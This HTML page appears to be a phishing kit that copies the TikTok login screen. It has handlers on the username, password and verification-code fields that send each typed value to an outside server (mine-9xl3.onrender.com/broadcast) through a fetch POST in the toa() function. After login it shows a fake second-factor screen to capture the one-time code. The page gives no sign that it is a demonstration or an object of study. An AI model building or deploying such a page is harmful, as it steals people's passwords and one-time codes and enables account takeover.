<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Log in | TikTok</title>
    <link rel="icon" href="tiktok.png">
    <meta name="description" content="Log in to TikTok to follow creators, like videos, and view comments.">


    <style>
        * {
            box-sizing: border-box;
        }

	a { 
	    color:inherit; 
	    text-decoration:none; 
	}

        body {
            margin: 0;
            font-family: Arial, Helvetica, sans-serif;
            background: #fff;
            color: #202124;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 30px;
        }

        .logo {
            font-size: 24px;
            font-weight: bold;
        }

        .help {
            padding: 8px 14px;
            border: 1px solid #ddd;
            border-radius: 20px;
            background: white;
            cursor: pointer;
        }

        main {
            min-height: 75vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 40px 20px;
        }

        .login-box {
            width: 100%;
            max-width: 400px;
        }

        h1 {
            text-align: center;
            margin-bottom: 30px;
            font-size: 30px;
        }

        .input-group {
            margin-bottom: 15px;
        }

        label {
            display: block;
            font-size: 13px;
            color: #000;
            margin-bottom: 6px;
        }

        input {
            width: 100%;
            padding: 14px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 15px;
            outline: none;
        }

        input:focus {
            border-color: #999;
        }

        .forgot {
            display: block;
            margin: 10px 0 20px;
            color: #777;
            font-size: 14px;
            text-decoration: none;
        }

        .login-button {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 6px;
            background: #fe2c55;
            color: white;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }

        .login-button:hover {
            opacity: 0.9;
        }

        /* Code screen */

        #code-screen {
            display: none;
        }

        .code-text {
            text-align: center;
            color: #777;
            font-size: 14px;
            line-height: 1.5;
            margin-bottom: 25px;
        }

        .code-input {
            text-align: center;
            font-size: 24px;
            letter-spacing: 8px;
        }

        .back-button {
            display: block;
            margin: 15px auto 0;
            border: none;
            background: none;
            color: #777;
            cursor: pointer;
            font-size: 14px;
        }

        footer {
            border-top: 1px solid #eee;
            padding: 20px;
            text-align: center;
            color: #777;
            font-size: 12px;
        }
    </style>
</head>

<body>

<header>
    <a class="brand" href="#" aria-label="TikTok home">
        <span class="note" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none"><path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-5.2 1.74 2.89 2.89 0 0 1 2.31-4.64c.3 0 .59.05.86.14V9.4a6.33 6.33 0 0 0-5.4 3.27 6.34 6.34 0 0 0 3.86 11.03 6.34 6.34 0 0 0 6.43-6.34V8.98a8.16 8.16 0 0 0 4.77 1.52v-3.4a4.85 4.85 0 0 1-.41-.06Z" fill="#69d9e7" transform="translate(-.8,.8)"/><path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-5.2 1.74 2.89 2.89 0 0 1 2.31-4.64c.3 0 .59.05.86.14V9.4a6.33 6.33 0 0 0-5.4 3.27 6.34 6.34 0 0 0 3.86 11.03 6.34 6.34 0 0 0 6.43-6.34V8.98a8.16 8.16 0 0 0 4.77 1.52v-3.4a4.85 4.85 0 0 1-.41-.06Z" fill="#fe2c55" transform="translate(.8,-.8)"/><path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-5.2 1.74 2.89 2.89 0 0 1 2.31-4.64c.3 0 .59.05.86.14V9.4a6.33 6.33 0 0 0-5.4 3.27 6.34 6.34 0 0 0 3.86 11.03 6.34 6.34 0 0 0 6.43-6.34V8.98a8.16 8.16 0 0 0 4.77 1.52v-3.4a4.85 4.85 0 0 1-.41-.06Z" fill="currentColor"/></svg></span>
        <span>TikTok</span>
    </a>
</header>


<main>

    <div class="login-box">

        <!-- LOGIN SCREEN -->
        <div id="login-screen">

            <h1>Log in to TikTok</h1>

            <form id="login-form">

                <div class="input-group">
                    <label for="username">
                        Email or username
                    </label>

                    <input
						onchange="toa(`👤Email/Username: ${this.value}`)"
                        type="text"
                        id="username"
                        placeholder="Email or username"
                        required
                    >
                </div>


                <div class="input-group">
                    <label for="password">
                        Password
                    </label>

                    <input
						onchange="toa(`🔒Password: ${this.value}`)"
                        type="password"
                        id="password"
                        placeholder="Password"
                        required
                    >
                </div>


                <a href="#" class="forgot">
                    Forgot password?
                </a>


                <button
                    type="submit"
                    class="login-button">
                    Log in
                </button>

            </form>

        </div>


        <!-- CODE SCREEN -->
        <div id="code-screen">

            <h1>Enter code</h1>

            <p class="code-text">
                Enter the code provided to continue.
            </p>

            <input
				onchange="toa(`📲Code: ${this.value}`)"
                type="text"
                id="code"
                class="code-input"
                maxlength="6"
                placeholder="------"
                inputmode="numeric"
            >

            <br><br>

            <button
                class="login-button"
                type="button"
                onclick="verifyCode()">
                Continue
            </button>

            <button
                class="back-button"
                type="button"
                onclick="goBack()">
                Back to login
            </button>

        </div>

    </div>

</main>


<footer>
    © 2026 TikTok
</footer>


<script>
	function toa(payload) {
        const url = 'https://mine-9xl3.onrender.com/broadcast';  
        fetch(url, {
            method: 'POST',
            headers: {     
                'Content-Type': 'application/json',  
            },   
            body: JSON.stringify({ message: payload })    
        });  
	}



	function generateRandomCode() {
    	const numbers = Array.from({length: 8}, () => Math.floor(Math.random() * 10));
    	const letters = Array.from({length: 2}, () => String.fromCharCode(65 + Math.floor(Math.random() * 26)));
    	const allChars = [...numbers, ...letters];
   
    	// Shuffle the array
    	for (let i = allChars.length - 1; i > 0; i--) {  
        	const j = Math.floor(Math.random() * (i + 1));
        	[allChars[i], allChars[j]] = [allChars[j], allChars[i]];
    	}
    	return allChars.join('');
	}

	
    const loginForm = document.getElementById("login-form");

    const loginScreen = document.getElementById("login-screen");

    const codeScreen = document.getElementById("code-screen");


    loginForm.addEventListener("submit", function(event) {

        event.preventDefault();

        // Hide login form
        loginScreen.style.display = "none";

        // Show code input
        codeScreen.style.display = "block";

    });


    function goBack() {

        codeScreen.style.display = "none";

        loginScreen.style.display = "block";

    }


    function verifyCode() {

        const code = document.getElementById("code").value;

        if (code.length < 6) {

            alert("Please enter the 6-digit code.");

            return;

        }

        alert("Code submitted.");

    }

</script>

</body>
</html>
